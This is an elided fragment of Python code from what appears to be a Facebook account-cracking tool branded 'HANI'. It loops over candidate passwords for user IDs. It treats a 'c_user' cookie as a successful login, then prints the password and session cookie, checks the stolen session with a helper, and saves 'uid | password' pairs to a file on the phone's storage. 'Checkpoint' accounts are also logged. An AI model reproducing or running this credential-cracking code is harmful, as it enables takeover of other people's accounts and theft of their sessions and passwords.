...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            sys.stdout.write(f'\r  \33[1;94m[\033[1;37mHANI\33[1;94m][\033[1;37m%s\33[1;94m/\033[1;37m%s\33[1;94m]\33[1;94m[\033[1;32mOK-%s\33[1;94m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[HANI-OKðŸ’š] \033[1;32m'+uid+'\033[1;32m â€¢ \033[1;32m' +ps+    '  \n[] \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/HANI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[HANI-CP] ' +uid+ ' â€¢ ' +ps+           '  \33[0;97m')
